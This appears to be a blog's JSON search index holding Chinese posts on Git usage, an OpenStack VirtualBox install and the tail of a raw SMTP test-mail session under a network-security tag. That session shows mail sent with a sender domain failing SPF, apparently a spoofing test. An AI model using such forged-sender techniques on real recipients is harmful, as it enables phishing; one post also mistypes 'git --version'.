admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\n -> Authentication-Results: mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Message-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\n -> Date: Mon, 30 Mar 2020 15:32:58 +0800\n -> To: worktestnet321@163.com\n -> From: worktestnet321@163.com\n -> Subject: test mail\n -> X-Mailer: saucer-man.com\n -> \n -> 4008208820 DNC 橡果国际 新购物 新生活\n -> \n -> .\n<-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n出现250的状态码发送成功，","tags":["网络安全"],"categories":["技术"]},{"title":"Ubuntu 升级Git版本","url":"/2023/03/26/ubuntu-update-git/","content":"\nUbuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。\n\n只需要依次执行以下代码就OK了。\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\nsudo apt-get update\nsudo apt-get install git\n```\n\n执行完事后，可以通过以下命令查看Git的版本。\n\n```bash\ngit --veision\n```\n\n<!-- more -->\n\n>节选自SCDN诸葛_瓜皮的文章\n>https://blog.csdn.net/Ezreal_King/article/details/79999131\n>记录本文章纯粹是为了之后自己方便寻找","tags":["Ubuntu","Git"],"categories":["探索"]},{"title":"Git 拒绝合并无关历史","url":"/2023/03/26/git-merge-error/","content":"\n### 问题描述\n\n可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。\n\n<!-- more -->\n\n```bash\n提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次\n提示：pull 操作之前执行下面一条命令来抑制本消息：\n提示：\n提示：  git config pull.rebase false  # 合并\n提示：  git config pull.rebase true   # 变基\n提示：  git config pull.ff only       # 仅快进\n提示：\n提示：您可以将 \"git config\" 替换为 \"git config --global\" 以便为所有仓库设置\n提示：缺省的配置项。您也可以在每次执行 pull 命令时添加 --rebase、--no-rebase，\n提示：或者 --ff-only 参数覆盖缺省设置。\n致命错误：需要指定如何调和偏离的分支。\n```\n\n说实话我没怎么看懂这个报错，不过给了提示，我就跟着这个提示进行操作。结果：\n\n```bash\nknight@knight:~/blog/lxp731.github.io$ git config pull.rebase false\nknight@knight:~/blog/lxp731.github.io$ git pull\n致命错误：拒绝合并无关的历史\n```\n\n然后没办法上网查找看到这样的解决办法：\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n### 解决办法\n\n```bash\ngit pull origin main --allow-unrelated-histories \n```\n\nPS:记得把“main”修改为自己想pull下来的分支\n\n由此问题解决!!!","tags":["Git"],"categories":["探索"]},{"title":"Git进阶操作--回滚代码","url":"/2023/03/24/git-rollback/","content":"\n### 问题描述\n\n可能是我之前的操作都太简单了，几乎都是一遍提交，从来没有遇到过回滚的情况，也没有进行深入的研究。直到今天，我把一次修改提交之后，发现博客网站全部乱码，倒也不是乱码，只是没有任何秩序可言，我当时只感脑壳一白。我是谁？我在哪？我在干什么？\n\n我真的不知道是做了什么修改，可能是因为修改时几次误操作，而且操作过那么多文件，要想一个一个去排查，几乎是不可能的。\n\n我想这可能就是Git之所以能够封神的原因之一吧，他支持项目的回滚。可以回到任何一个提交的修改点，就像是每次提交都像是给虚拟机拍了一个快照。\n\n那么进入今天的正题吧！！！\n\n<!-- more -->\n\n### 解决办法\n\n1. 首先在网站上把要恢复的Git-sha码复制下来\n\n![](https://lxp731.github.io/img/git/git_sha.png \"sha码\")\n\n2. 接下来回到终端执行\n\n```bash\ngit reset --hard commit_sha\n```\n\n把“commit_sha”换成刚刚复制下来的sha码，有时候在终端粘贴的时候会在末尾带一个\"~\"，要记得删掉。\n\n3. 最后强制提交更改\n\n```bash\ngit push origin HEAD --force\n```\n执行完项目就完成回滚了，学会这一招儿，你就可以尽情造作了，玩坏了就回滚，so easy!!!","tags":["Git"],"categories":["探索"]},{"title":"OpenStack在windows上安装教程","url":"/2023/03/19/openstack-install/","content":"\n### 项目准备\n\n1. 安装VirtualBOX\n\n> https://download.virtualbox.org/virtualbox/7.0.6/VirtualBox-7.0.6-155176-Win.exe\n\n2. 下载OpenStack的项目资源\n\nOpenStack https://www.aliyundrive.com/s/3uZc1uBwq24 提取码: m8zf\n\n如果是下载的这个网站提供的OpenStack项目资源，那么可以进行查看一下以下几个文件都应该已经存在了。\n\n<!-- more -->\n\n![](https://lxp731.github.io/img/openstack/1.png)\n\n### 开始安装\n\n1. 接下来修改几个文件的配置文件,全部换成自己电脑中VirtualBOX的绝对安装路径\n\n![](https://lxp731.github.io/img/openstack/modify_config.png)\n\n2. 完成后双击运行create_hostnet.bat脚本，出现succeeded字样安装完成。\n\n![](https://lxp731.github.io/img/openstack/succeeded.png)\n\n3. 打开VirtualBOX---管理---主机网络管理器，发现会多出来以下两个Adapter：\n\n![](https://lxp731.github.io/img/openstack/Adapter.png)\n\n4. 在virtualbox中导入.ova文件的虚拟机\n\nvirtualbox---管理---导入虚拟电脑，分别导入第一张图中的computer1.ova文件和controller.ova文件\n\n5. 运行虚拟电脑\n\n鼠标右击之后选择无页面启动就OK。\n\n### 体验OpenStack\n\n接着在浏览器输入```127.0.0.1:8888/horizon```回车\n\n默认OpenStack存在两个用户：\n\n\n|||\n|:--:|:--:|\n|user|password|\n|admin|admin_user_secret|\n|myuser|myuser_user_pass|","tags":["Openstack"],"categories":["探索"]},{"title":"Git 的基本操作","url":"/2023/03/13/git-basic-operation/","content":"\n添加修改到暂存区\n\n```git\ngit add .\n```\n\n添加提交说明\n\n```git\ngit commit -m \"modify file1\"\n```\n\n把本地修改推送到远程仓库\n\n<!-- more -->\n\n```git \ngit push origin main\n```\n>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。\n\n克隆仓库\n\n```git \ngit clone \"your link\"\n```\n>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。\n\n同步远程分支\n\n```git\ngit pull\n```\n\n删除push和fetch地址\n\n```git \ngit remote rm origin\n```\n\n添加push和fetch地址\n\n```git\ngit remote add origin\n```\n\n列出所有的分支(包括本地分支和远程分支)\n\n```git\ngit branch -a\n```\n\n在本地切换分支\n\n```git \ngit checkout \"branch name\"\n```\n\n在本地创建分支\n\n```git \ngit checkout -b \"branch name\"\n```\n\n>PS：这个命令在创建分支的同时也会将当前分支切换过去\n\n修改本地分支名字\n\n```git \ngit branch -m \"old branch name\" \"new branch name\"\n```\n\n删除本地分支\n\n```git\ngit branch -d \"branch name\"\n```\n\n删除远程分支\n\n```git \ngit push origin --delete \"remote branch name\"\n```","tags":["Git"],"categories":["探索"]}]